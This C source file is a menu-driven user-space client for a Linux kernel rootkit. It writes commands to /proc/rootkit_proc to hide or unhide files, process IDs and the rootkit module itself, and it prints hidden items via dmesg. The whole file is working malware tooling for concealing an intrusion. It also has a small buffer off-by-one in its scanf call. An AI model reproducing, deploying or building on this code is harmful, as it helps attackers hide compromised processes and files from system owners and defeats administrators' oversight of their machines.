#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>


void display_intro(void){
	printf("Options:\n");
	printf("\t1. Hide file\n");
	printf("\t2. Unhide file\n");
	printf("\t3. Hide PID\n");
	printf("\t4. Unhide PID\n");
	printf("\t5. See hidden files/PIDs\n");
	printf("\t6. Hide module\n");
	printf("\t7. Unhide module\n");
}

int get_option(void){
	char c;
	printf("Select an option: ");
	do {
		c = fgetc(stdin);
	} while (c == '\n');
	return c - '0';
}

void send_msg_file(int id, int fd){
	char filename[256];
	printf("Introduce the name of the file: ");
	scanf("%256s", filename);

	int size = sizeof(id) + strlen(filename) + 1;
	void* msg = malloc(size);
	memcpy(msg, &id, sizeof(id));
	memcpy(msg + sizeof(id), filename, strlen(filename) + 1);

	if (write(fd, msg, size) != size)
		printf("ERROR WRITE\n");

	free(msg);
}

void send_msg_pid(int id, int fd){
	int msg[2];
	msg[0] = id;
	printf("Introduce the PID of the process: ");
	scanf("%d", &msg[1]);

	if (write(fd, msg, sizeof(msg)) != sizeof(msg))
		printf("ERROR WRITE\n");
}

void send_msg_id(int id, int fd){
	if (write(fd, &id, sizeof(id)) != sizeof(id))
		printf("ERROR WRITE\n");
}

void hide_file(int fd){
	send_msg_file(1, fd);
}

void unhide_file(int fd){
	send_msg_file(2, fd);
}

void hide_pid(int fd){
	send_msg_pid(3, fd);
}

void unhide_pid(int fd){
	send_msg_pid(4, fd);
}

void see_hidden(int fd){
	send_msg_id(5, fd);
	printf("Hidden files and PIDs shown in dmesg:\n");
	system("dmesg | tail -2"); //could there be a race condition?
}

void hide_module(int fd){
	send_msg_id(6, fd);
}

void unhide_module(int fd){
	send_msg_id(7, fd);
}

int main(int argc, char** argv){
	int fd, correct;
	if ((fd = open("/proc/rootkit_proc", O_WRONLY)) == -1){
		printf("ERROR OPEN: Is the rootkit running?\n");
		return -1;
	}
	printf("Welcome!\n");

	while (1){
		correct = 1;
		display_intro();
		int option = get_option();
		switch (option){
			case 1:
				hide_file(fd);
				break;
			case 2:
				unhide_file(fd);
				break;
			case 3:
				hide_pid(fd);
				break;
			case 4:
				unhide_pid(fd);
				break;
			case 5:
				see_hidden(fd);
				break;
			case 6:
				hide_module(fd);
				break;
			case 7:
				unhide_module(fd);
				break;
			default:
				correct = 0;
		}
		if (correct)
			printf("Done\n\n");
		else
			printf("Wrong option.\n\n");
	}
	close(fd);
	return 0;
}
